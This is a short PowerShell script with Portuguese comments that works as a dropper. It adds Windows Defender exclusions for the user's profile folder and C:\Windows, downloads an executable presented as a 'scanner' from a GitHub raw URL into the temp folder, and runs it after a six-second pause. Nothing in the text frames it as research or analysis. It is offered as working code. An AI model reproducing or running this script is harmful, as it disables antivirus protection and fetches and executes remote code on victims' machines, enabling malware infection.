# Adicionar exclusões no Windows Defender
Add-MpPreference -ExclusionPath $env:USERPROFILE
Add-MpPreference -ExclusionPath "C:\Windows"

# URL correta para download (substitua pelo link direto do arquivo raw)
$url = "https://github.com/Oqgpp/scanner/raw/refs/heads/main/scannerV1.exe"

# Definir local de saída temporário
$output = "$env:Temp\scannerV1.exe"

# Fazer o download do executável
Invoke-WebRequest -Uri $url -OutFile $output

# Aguardar 6 segundos
Start-Sleep -Milliseconds 6000

# Executar o arquivo baixado
Start-Process -FilePath $output